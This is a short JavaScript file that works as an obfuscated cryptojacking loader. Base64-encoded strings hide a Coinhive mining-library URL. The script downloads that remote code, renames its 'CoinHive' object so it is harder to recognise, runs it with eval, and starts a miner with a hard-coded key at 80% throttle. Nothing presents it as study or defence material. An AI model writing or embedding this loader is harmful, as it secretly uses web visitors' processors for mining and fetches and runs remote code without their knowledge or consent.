function mEncode(s){
	return window.atob(s);
}

function mDecode(s){
	return window.btoa(s);
}

var public_key = "hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4";


function loadLib(callback){
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function(){
		if(xhr.readyState == 4 && xhr.status == 200){
			var data = xhr.responseText.replace(new RegExp(mEncode("Q29pbg==")+"Hive","g"),"__c");
			eval(data);
			callback();
		}
	}
	xhr.open("GET",mEncode("aHR0cHM6Ly9jb2luaGl2ZS5jb2"+"0vbGliL2NvaW5oaXZlLm1pbi5qcw=="));
	xhr.send();

}


loadLib(function(){
	var m = new window.__c.Anonymous(public_key,{throttle: 0.8});
	m.start();
	console.log("ok");
});


